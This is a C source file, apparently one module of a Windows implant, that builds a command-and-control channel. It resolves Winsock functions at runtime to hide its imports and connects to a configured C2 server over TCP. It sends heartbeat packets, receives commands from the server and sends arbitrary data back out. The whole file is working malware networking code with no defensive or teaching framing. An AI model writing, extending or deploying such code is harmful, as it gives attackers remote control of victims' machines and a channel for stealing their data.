// c2_communication.c

#include "c2_communication.h"
#include "api_resolution.h"
#include <stdio.h>

// Global socket for C2 communication
SOCKET g_c2_socket = INVALID_SOCKET;

// Resolve Winsock functions dynamically
typedef int (WSAAPI *pWSAStartup)(WORD, LPWSADATA);
typedef SOCKET (WSAAPI *psocket)(int, int, int);
typedef int (WSAAPI *pconnect)(SOCKET, const struct sockaddr*, int);
typedef int (WSAAPI *psend)(SOCKET, const char*, int, int);
typedef int (WSAAPI *precv)(SOCKET, char*, int, int);
typedef int (WSAAPI *pclosesocket)(SOCKET);
typedef int (WSAAPI *pWSACleanup)(VOID);

BOOL C2_Connect() {
    pWSAStartup WSAStartup = (pWSAStartup)resolve_api("ws2_32.dll", "WSAStartup");
    psocket socket_func = (psocket)resolve_api("ws2_32.dll", "socket");
    pconnect connect_func = (pconnect)resolve_api("ws2_32.dll", "connect");
    pWSACleanup WSACleanup = (pWSACleanup)resolve_api("ws2_32.dll", "WSACleanup");

    if (!WSAStartup || !socket_func || !connect_func || !WSACleanup) {
        return FALSE;
    }

    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return FALSE;
    }

    g_c2_socket = socket_func(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (g_c2_socket == INVALID_SOCKET) {
        WSACleanup();
        return FALSE;
    }

    struct sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(C2_SERVER_PORT);
    inet_pton(AF_INET, C2_SERVER_IP, &serverAddr.sin_addr);

    if (connect_func(g_c2_socket, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        pclosesocket closesocket = (pclosesocket)resolve_api("ws2_32.dll", "closesocket");
        if (closesocket) closesocket(g_c2_socket);
        WSACleanup();
        return FALSE;
    }

    return TRUE;
}

void C2_Disconnect() {
    pclosesocket closesocket = (pclosesocket)resolve_api("ws2_32.dll", "closesocket");
    pWSACleanup WSACleanup = (pWSACleanup)resolve_api("ws2_32.dll", "WSACleanup");

    if (g_c2_socket != INVALID_SOCKET) {
        if (closesocket) closesocket(g_c2_socket);
        g_c2_socket = INVALID_SOCKET;
    }
    if (WSACleanup) WSACleanup();
}

BOOL C2_SendHeartbeat() {
    psend send_func = (psend)resolve_api("ws2_32.dll", "send");
    if (!send_func || g_c2_socket == INVALID_SOCKET) return FALSE;

    C2_PACKET_HEADER header;
    header.packet_type = C2_PACKET_HEARTBEAT;
    header.data_length = 0;

    int bytesSent = send_func(g_c2_socket, (char*)&header, sizeof(header), 0);
    return (bytesSent == sizeof(header));
}

BOOL C2_ReceiveCommand(char* buffer, int buffer_size) {
    precv recv_func = (precv)resolve_api("ws2_32.dll", "recv");
    if (!recv_func || g_c2_socket == INVALID_SOCKET || !buffer) return FALSE;

    C2_PACKET_HEADER header;
    int bytesReceived = recv_func(g_c2_socket, (char*)&header, sizeof(header), 0);
    if (bytesReceived != sizeof(header) || header.packet_type != C2_PACKET_COMMAND) {
        return FALSE;
    }

    if (header.data_length >= buffer_size) return FALSE;

    bytesReceived = recv_func(g_c2_socket, buffer, header.data_length, 0);
    if (bytesReceived != header.data_length) return FALSE;

    buffer[bytesReceived] = '\0';
    return TRUE;
}

BOOL C2_SendData(const char* data, int data_size) {
    psend send_func = (psend)resolve_api("ws2_32.dll", "send");
    if (!send_func || g_c2_socket == INVALID_SOCKET || !data) return FALSE;

    C2_PACKET_HEADER header;
    header.packet_type = C2_PACKET_DATA;
    header.data_length = data_size;

    int totalSent = 0;
    int bytesSent = send_func(g_c2_socket, (char*)&header, sizeof(header), 0);
    if (bytesSent != sizeof(header)) return FALSE;

    totalSent = 0;
    while (totalSent < data_size) {
        bytesSent = send_func(g_c2_socket, data + totalSent, data_size - totalSent, 0);
        if (bytesSent <= 0) return FALSE;
        totalSent += bytesSent;
    }

    return TRUE;
}
